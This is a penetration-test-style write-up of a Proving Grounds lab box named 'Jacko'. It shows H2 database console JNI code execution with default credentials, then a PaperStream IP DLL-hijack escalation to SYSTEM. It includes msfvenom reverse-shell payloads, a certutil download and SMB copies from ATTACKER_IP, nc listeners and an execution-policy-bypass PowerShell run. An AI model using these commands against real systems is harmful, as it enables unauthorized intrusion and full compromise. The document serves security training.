# PG Practice Jacko - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-7

---

## 0. Lessons Learned

The absolute path for PowerShell is necessary to use in constrained/unstable shells and can be found at:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

With multiple levels of parsing and escaping (SQL, Java, Windows), backslashes (`\`) can get consumed as escape characters. Windows APIs accept forward slashes (`/`) or you can escape backslashes (`\\`).  Most H2/JNI payloads and Java RCE payloads on Windows use forward slash (`/`) paths by default.

---

## 1. Executive Summary

A penetration test was conducted against the target host “Jacko” as part of a Proving Grounds Practice engagement. The assessment identified multiple vulnerabilities leading to full system compromise.

Initial access was achieved through the exposed H2 Database Engine service running on TCP port 8082. The application permitted abuse of the H2 JNI functionality, resulting in arbitrary command execution under the context of user `tony`.

Privilege escalation to `NT AUTHORITY\SYSTEM` was achieved through exploitation of the vulnerable PaperStream IP software installation using DLL hijacking techniques.

The assessment demonstrated complete compromise of the target system and access to both user and administrative proof files.

---

## 2. Scope

- **Target:** 192.168.159.66
- **Environment:** PG Practice Jacko
- **Testing Window:** 2026-5-6 to 2026-5-7
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.159.66 -T4 -oA jacko_tcp
```

Relevant Output:

```
80/tcp open  http
8082/tcp open h2 database http console
```

Interpretation:

The target exposed an H2 Database Engine web console on TCP port 8082, which became the primary attack surface.

---

## 5. Enumeration

### H2 Database Console Access

Browsing to the web service on port 8082 revealed the H2 Database Engine login interface.

The default configuration allowed connection attempts using embedded database settings.

Default Credentials:

```
Username: sa
Password: (blank)
```

Interpretation:

The exposed H2 database console was accessible without authentication restrictions and allowed SQL execution.

---

## 6. Initial Access

### H2 JNI Code Execution

Research identified public exploitation techniques for H2 Database Engine version 1.4.199 leveraging JNI native library loading functionality.

A malicious DLL was written to disk and loaded through the H2 System.load functionality.

Command:

```
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT(

--snip--

'SELECT NULL "'));
```

Command:

```
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
```

Command:

```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

Relevant Output:

```
jacko\tony
```

Interpretation:

Arbitrary command execution was achieved as the user tony.

### Generate Staged Reverse Shell Payload

A staged payload was generated.

Command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8082 -f exe -o shell.exe
```

Interpretation:

A staged payload was generated to ensure reliable shell execution during privilege escalation.

### Download Payload

Command:

```
python3 -m http.server 80
```

Command:

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:/Windows/Tasks/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Interpretation:

The attacker successfully transferred required tooling to the target system.

### Reverse Shell as Tony

Listener:

```
rlwrap nc -lnvp 8082
```

Command:

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Tasks/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Relevant Output:

```
Microsoft Windows [Version 10.0.18363.836]
C:\Program Files (x86)\H2\service>
```

Interpretation:

A stable reverse shell was established as the user `tony`.

---

## 7. Post-Exploitation

### PaperStream IP Enumeration

Command:

```
cd "C:\Program Files (x86)"
dir
```

Relevant Output:

```
PaperStream IP
```

Command:

```
cd "PaperStream IP"
dir /a /o /q
```

Relevant Output:

```
NT AUTHORITY\SYSTEM
```

Interpretation:

The PaperStream IP application operated with elevated privileges and matched a known DLL hijacking vulnerability.

---

## 8. Privilege Escalation

### Generate Malicious DLL

Command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8082 -f dll -o UninOldIS.dll
```

Interpretation:

A malicious DLL payload was generated to exploit the vulnerable application loading process.

### Transfer Exploit Files

PaperStream IP 1.42 Local Privilege Escalation used as `exploit.ps1`.

Command:

```
sudo impacket-smbserver share -smb2support .
```

Commands:

```
cd C:\Windows\Temp
copy \\ATTACKER_IP\share\exploit.ps1
copy \\ATTACKER_IP\share\UninOldIS.dll
```

Interpretation:

The exploit script and malicious DLL were copied to the target system.

### Execute Privilege Escalation Exploit

Listener:

```
rlwrap nc -lnvp 8082
```

Execution:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\exploit.ps1
```

Relevant Output:

```
connection received
Microsoft Windows [Version 10.0.18363.836]
```

Command:

```
whoami
```

Output:

```
nt authority\system
```

Interpretation:

Successful privilege escalation to `NT AUTHORITY\SYSTEM` was achieved through exploitation of the vulnerable PaperStream IP installation.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\tony\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Exposed Administrative Console Allowing Remote Code Execution

**Severity:** Critical

**Description:**
An administrative database or application console was exposed externally and allowed execution of operating system commands through unsafe functionality.

**Impact:**
Attackers could execute arbitrary commands remotely and obtain code execution on the underlying system.

**Recommendation:**
Restrict administrative interfaces to localhost or trusted networks, implement authentication and network access controls, and upgrade vulnerable software to supported versions.

### **Finding:** Insecure DLL Loading Allowing Privilege Escalation

**Severity:** Critical

**Description:**
An installed application was vulnerable to insecure DLL loading or DLL hijacking, allowing execution of attacker-controlled code with elevated privileges.

**Impact:**
Attackers with local access could escalate privileges to SYSTEM and fully compromise the operating system.

**Recommendation:**
Update or remove vulnerable software, enforce secure DLL search order practices, and restrict write access to application directories.

---

## 11. Appendix

H2 Database 1.4.199 - JNI Code Execution - 
[https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384)

Writeup on Exploit H2 Database with JNI - 
[https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html](https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html)

PaperStream IP 1.42 Local Privilege Escalation (`exploit.ps1`) - 
[https://www.exploit-db.com/exploits/49382](https://www.exploit-db.com/exploits/49382)